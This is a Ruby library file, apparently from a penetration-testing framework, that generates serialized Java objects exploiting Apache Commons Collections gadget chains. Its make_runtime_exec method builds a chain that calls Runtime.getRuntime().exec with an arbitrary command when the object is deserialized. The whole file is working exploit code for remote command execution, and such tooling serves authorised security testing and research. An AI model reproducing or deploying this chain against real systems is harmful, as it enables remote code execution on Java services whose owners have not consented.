# -*- coding: binary -*-
require 'rex/java/serialization/metamodel'
require_relative 'util'

module Rex
  module Java
    module Serialization
      module Payloads
        class Collections
          def self.get_pkg(version)
            case version
            when 3
              'org/apache/commons/collections'
            when 4
              'org/apache/commons/collections4'
            else
              raise NotImplementedError
            end
          end

          def self.make_trigger(start, chain, version = 3)
            pkg = get_pkg(version)
            innerMap = Model::JavaObject.new('Ljava/util/HashMap;', {})
            lazyMap = Model::JavaObject.new('L' + pkg + '/map/LazyMap;', 'factory' => chain, 'map' => innerMap)
            tiedMapEntry = Model::JavaObject.new('L' + pkg + '/keyvalue/TiedMapEntry;', 'map' => lazyMap,
                                                 'key' => start)
            Model::JavaObject.new('Ljava/util/HashSet;', 'elements' => [tiedMapEntry])
          end

          def self.make_invoke_noarg(obj, method, version = 3)
            pkg = get_pkg(version)
            chain = Model::JavaObject.new('L' + pkg + '/functors/ChainedTransformer;', 
                                          'iTransformers' => Model::JavaArray.new('L' + pkg + '/Transformer;', [
                                            Model::JavaObject.new('L' + pkg + '/functors/InvokerTransformer;', 
                                                                  'iMethodName' => method,
                                                                  'iParamTypes' => Model::JavaArray.new('Ljava/lang/Class;', []),
                                                                  'iArgs' => Model::JavaArray.new('Ljava/lang/Object;', []))
            ]))
            make_trigger(obj, chain, version)
          end

          def self.make_runtime_exec(cmd, version = 3)
            pkg = get_pkg(version)
            chain = Model::JavaObject.new('L' + pkg + '/functors/ChainedTransformer;', 
                                          'iTransformers' => Model::JavaArray.new('L' + pkg + '/Transformer;', [
                                            Model::JavaObject.new('L' + pkg + '/functors/ConstantTransformer;', 'iConstant' => Model::JavaClass.new('Ljava/lang/Runtime;')),
                                            Model::JavaObject.new('L' + pkg + '/functors/InvokerTransformer;',                                                         'iMethodName' => 'getMethod',
                                                                  'iParamTypes' => Model::JavaArray.new('Ljava/lang/Class;', [
                                                                    Model::JavaClass.new('Ljava/lang/String;'),
                                                                    Model::JavaClass.new('[Ljava/lang/Class;')
                                            ]),
                                            'iArgs' => Model::JavaArray.new('Ljava/lang/Object;', [
                                              'getRuntime',
                                              Model::JavaArray.new('Ljava/lang/Class;', [])
                                            ])),
                                            Model::JavaObject.new('L' + pkg + '/functors/InvokerTransformer;',                                                         'iMethodName' => 'invoke',
                                                                  'iParamTypes' => Model::JavaArray.new('Ljava/lang/Class;', [
                                                                    Model::JavaClass.new('Ljava/lang/Object;'),
                                                                    Model::JavaClass.new('[Ljava/lang/Object;')
                                            ]),
                                            'iArgs' => Model::JavaArray.new('Ljava/lang/Object;', [
                                              nil,
                                              Model::JavaArray.new('Ljava/lang/Object;', [])
                                            ])),
                                            Model::JavaObject.new('L' + pkg + '/functors/InvokerTransformer;',                                                         'iMethodName' => 'exec',
                                                                  'iParamTypes' => Model::JavaArray.new('Ljava/lang/Class;', [
                                                                    Model::JavaClass.new('[Ljava/lang/String;')
                                            ]),
                                            'iArgs' => Model::JavaArray.new('Ljava/lang/Object;', [
                                              Model::JavaArray.new('Ljava/lang/String;', cmd)
                                            ]))
            ]))
            make_trigger(nil, chain, version)
          end
        end
      end
    end
  end
end
